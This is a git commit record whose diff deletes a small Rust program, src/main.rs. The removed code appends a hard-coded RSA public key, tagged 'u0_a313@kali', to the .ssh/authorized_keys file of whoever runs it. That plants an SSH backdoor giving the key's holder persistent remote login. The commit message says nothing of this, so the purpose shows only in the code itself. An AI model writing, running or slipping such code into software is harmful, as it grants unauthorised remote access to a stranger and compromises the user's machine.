9e1af0bd42b1f4e1ad21f6948a7f2fe98b2d9a82
Kelvin <87355778+rotleaf@users.noreply.github.com>
2024-03-15 21:44:45 +0300

    meh

--- src/main.rs
+++
@@ -1,7 +0,0 @@
-use std::fs::OpenOptions;
-use std::io::Write;
-
-fn main() {
-    let mut file_ref = OpenOptions::new().append(true).open(".ssh/authorized_keys").expect("unable to open file");
-    file_ref.write_all("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QfdNxXs1RPPfkgn6/nlG3yw6Ezbk7e4EDHkprYWa520zMoVZYHay3NNGetDs8cSGKLE+dqS4V5avK6qPsrWmnqpjuUbxpmwgY7bgkf7S7wC830jjJJfFRagnStUXGWKo0ZRGZk44pT8qWaQLoEpymoDk8I/Jg6DWAAYXbFUXcNg3Affc2l7AR6TkBc3ljEuCNI+7+n3YW0DdhW6XNl2FuJslW4pldDmFo/FZ9wMqth8A3dfH0dfOgCIGUMAiKAOsXaHte+1OnJN8GL8uRgjrF/FKxF09tc3R03BllLXGCHYXSiAjDtB4fCiwCPxs+EYbeHGMeKcPDqaPovaMv9PbwSmhqxUZrAtN0uhsHZtUs8h/d2QJ0MGL27D6a5Z+sULvBkk72BWH7TfrC1zM+suxSnzLWY+6nhWUHjNeVrXHCtXNmGWPh8BiMKP6TvIHw78q5a7W6pffThJTPy8vNFfPLGBaBqETUCZFBHwY14SNHVKBO7JRHZ26/JshRikjobU= u0_a313@kali\n".as_bytes()).expect("write failed");
-}
